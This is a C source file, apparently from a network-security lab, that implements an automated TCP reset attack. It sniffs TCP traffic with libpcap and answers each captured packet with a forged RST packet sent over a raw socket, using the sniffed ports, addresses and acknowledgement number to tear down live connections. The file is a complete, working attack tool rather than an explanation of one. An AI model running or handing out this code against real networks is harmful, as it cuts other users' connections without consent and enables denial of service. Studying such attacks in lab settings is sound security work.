#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h> // for close

#include "header.h"

/* default snap length (maximum bytes per packet to capture) */
#define SNAP_LEN 1518

#define PCKT_LEN 8192

unsigned short in_cksum (unsigned short *buf, int length)
{
   unsigned short *w = buf;
   int nleft = length;
   int sum = 0;
   unsigned short temp=0;

   /*
    * The algorithm uses a 32 bit accumulator (sum), adds
    * sequential 16 bit words to it, and at the end, folds back all
    * the carry bits from the top 16 bits into the lower 16 bits.
    */
   while (nleft > 1)  {
       sum += *w++;
       nleft -= 2;
   }

   /* treat the odd byte at the end, if any */
   if (nleft == 1) {
        *(u_char *)(&temp) = *(u_char *)w ;
        sum += temp;
   }

   /* add back carry outs from top 16 bits to low 16 bits */
   sum = (sum >> 16) + (sum & 0xffff);  // add hi 16 to low 16
   sum += (sum >> 16);                  // add carry
   return (unsigned short)(~sum);
}

/****************************************************************
  TCP checksum is calculated on the pseudo header, which includes
  the TCP header and data, plus some part of the IP header.
  Therefore, we need to construct the pseudo header first.
*****************************************************************/

unsigned short calculate_tcp_checksum(struct ipheader *ip)
{
   struct tcpheader *tcp = (struct tcpheader *)((u_char *)ip + sizeof(struct ipheader));

   int tcp_len = ntohs(ip->iph_len) - sizeof(struct ipheader);

   /* pseudo tcp header for the checksum computation */
   struct pseudo_tcp p_tcp;
   memset(&p_tcp, 0x0, sizeof(struct pseudo_tcp));

   p_tcp.saddr  = ip->iph_sourceip.s_addr;
   p_tcp.daddr  = ip->iph_destip.s_addr;
   p_tcp.mbz    = 0;
   p_tcp.ptcl   = IPPROTO_TCP;
   p_tcp.tcpl   = htons(tcp_len);
   memcpy(&p_tcp.tcp, tcp, tcp_len);

   return  (unsigned short) in_cksum((unsigned short *)&p_tcp, tcp_len + 12);
}


/*************************************************************
  Given an IP packet, send it out using a raw socket.
**************************************************************/
void send_raw_ip_packet(struct ipheader* ip)
{
    struct sockaddr_in dest_info;
    int enable = 1;

    // Step 1: Create a raw network socket.
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	if(sock < 1){
		perror("socket");
		exit(-1);
	}

    // Step 2: Set socket option.
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

    // Step 3: Provide needed information about destination.
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->iph_destip;

    // Step 4: Send the packet out.
    int bytes = sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
	if(bytes < 0){
		perror("bytes");
		exit(-1);
	}
    close(sock);
}


void spoofRSTPacket(u_short src_port, u_short dest_port, struct in_addr src_ip, struct in_addr dest_ip, u_int seq){
	// No data, just datagram
	char buffer[PCKT_LEN]; memset(buffer, 0, PCKT_LEN);

	// The size of the headers
	struct ipheader *ip = (struct ipheader *) buffer;
	struct tcpheader *tcp = (struct tcpheader *) (buffer + sizeof(struct ipheader));

	/*********************************************************
	Step 2: Fill in the TCP header.
	********************************************************/
	tcp->tcp_sport = htons(src_port);
	tcp->tcp_dport = htons(dest_port); 
	tcp->tcp_seq = htonl(seq);
	tcp->tcp_offx2 = 0x50;
	tcp->tcp_flags = 0x04;
	tcp->tcp_win =  htons(16384); 
	tcp->tcp_sum =  0;

	/*********************************************************
	Step 3: Fill in the IP header.
	********************************************************/
	ip->iph_ver = 4;   // Version (IPV4)
	ip->iph_ihl = 5;   // Header length
	ip->iph_ttl = 20;  // Time to live 
	ip->iph_sourceip.s_addr = src_ip.s_addr; // Source IP
	ip->iph_destip.s_addr = dest_ip.s_addr;  // Dest IP
	ip->iph_protocol = IPPROTO_TCP; // The value is 6.
	ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader));

	// Calculate tcp checksum here, as the checksum includes some part of the IP header
	tcp->tcp_sum = calculate_tcp_checksum(ip); 

	// No need to fill in the following fileds, as they will be set by the system.
	// ip->iph_chksum = ...

	/*********************************************************
	Step 4: Finally, send the spoofed packet
	********************************************************/

	//printf(" Spoofed!!       From: %s\n", inet_ntoa(ip->iph_sourceip));
	//printf(" Spoofed!!        To: %s\n", inet_ntoa(ip->iph_destip));

	//printf(" Spoofed!!  Src port: %d\n", ntohs(tcp->tcp_sport));
	//printf(" Spoofed!! Dst port: %d\n", ntohs(tcp->tcp_dport));
	//printf(" Spoofed!!  Sequence Number: %u\n", ntohl(tcp->tcp_seq));
	//printf(" Spoofed!!  Acknowledge Number: %u\n", ntohl(tcp->tcp_ack));

	send_raw_ip_packet(ip);
}	

/*
 * dissect/print packet
 */
void
got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{

	static int count = 1;                   /* packet counter */
	
	/* declare pointers to packet headers */
	const struct ethheader *ethernet;  /* The ethernet header [1] */
	const struct ipheader *ip;              /* The IP header */
	const struct tcpheader *tcp;            /* The TCP header */

	int size_ip;
	int size_tcp;
	
	//printf("\nPacket number %d:\n", count);
	count++;
	
	/* define ethernet header */
	ethernet = (struct ethheader*)(packet);
	
	/* define/compute ip header offset */
	ip = (struct ipheader*)(packet + sizeof(struct ethheader));
	size_ip = (ip -> iph_ihl) * 4;
	if (size_ip < 20) {
		printf("   * Invalid IP header length: %u bytes\n", size_ip);
		return;
	}

	/* print source and destination IP addresses */
	//printf("       From: %s\n", inet_ntoa(ip->iph_sourceip));
	//printf("         To: %s\n", inet_ntoa(ip->iph_destip));
	
	/* determine protocol */	
	switch(ip->iph_protocol) {
		case IPPROTO_TCP:
			//printf("   Protocol: TCP\n");
			break;
		case IPPROTO_UDP:
			printf("   Protocol: UDP\n");
			return;
		case IPPROTO_ICMP:
			printf("   Protocol: ICMP\n");
			return;
		case IPPROTO_IP:
			printf("   Protocol: IP\n");
			return;
		default:
			printf("   Protocol: unknown\n");
			return;
	}
	
	/* define/compute tcp header offset */
	tcp = (struct tcpheader*)(packet + sizeof(struct ethheader) + size_ip);
	size_tcp = TH_OFF(tcp)*4;
	if (size_tcp < 20) {
		printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
		return;
	}
	
//	printf("   Src port: %d\n", ntohs(tcp->tcp_sport));
//	printf("   Dst port: %d\n", ntohs(tcp->tcp_dport));
//	printf("   Sequence Number: %u\n", ntohl(tcp->tcp_seq));
//	printf("   Acknowledge Number: %u\n", ntohl(tcp->tcp_ack));

	//spoofRSTPacket(ntohs(tcp -> tcp_sport), ntohs(tcp -> tcp_dport), ip -> iph_sourceip, ip -> iph_destip, ntohl(tcp -> tcp_seq) + 1 );
	spoofRSTPacket(ntohs(tcp -> tcp_dport), ntohs(tcp -> tcp_sport), ip -> iph_destip, ip -> iph_sourceip, ntohl(tcp -> tcp_ack) );

	return;
}

int main(int argc, char **argv)
{
	//freopen("output.txt", "w", stdout);

	char *dev = NULL;			/* capture device name */
	char errbuf[PCAP_ERRBUF_SIZE];		/* error buffer */
	pcap_t *handle;				/* packet capture handle */

	char filter_exp[] = "tcp";		/* filter expression [3] */
	struct bpf_program fp;			/* compiled filter program (expression) */
	bpf_u_int32 mask;			/* subnet mask */
	bpf_u_int32 net;			/* ip */
	int num_packets = -1;			/* number of packets to capture */

	/* find a capture device if not specified on command-line */
	dev = pcap_lookupdev(errbuf);
	if (dev == NULL) {
		fprintf(stderr, "Couldn't find default device: %s\n",
		    errbuf);
		exit(EXIT_FAILURE);
	}
	
	/* get network number and mask associated with capture device */
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n",
		    dev, errbuf);
		net = 0;
		mask = 0;
	}

	/* print capture info */
	printf("Device: %s\n", dev);
	printf("Number of packets: %d\n", num_packets);
	printf("Filter expression: %s\n", filter_exp);

	/* open capture device */
	handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		exit(EXIT_FAILURE);
	}

	/* make sure we're capturing on an Ethernet device [2] */
	if (pcap_datalink(handle) != DLT_EN10MB) {
		fprintf(stderr, "%s is not an Ethernet\n", dev);
		exit(EXIT_FAILURE);
	}

	/* compile the filter expression */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n",
		    filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	/* apply the compiled filter */
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n",
		    filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	/* now we can set our callback function */
	pcap_loop(handle, num_packets, got_packet, NULL);

	/* cleanup */
	pcap_freecode(&fp);
	pcap_close(handle);

	printf("\nCapture complete.\n");

return 0;
}

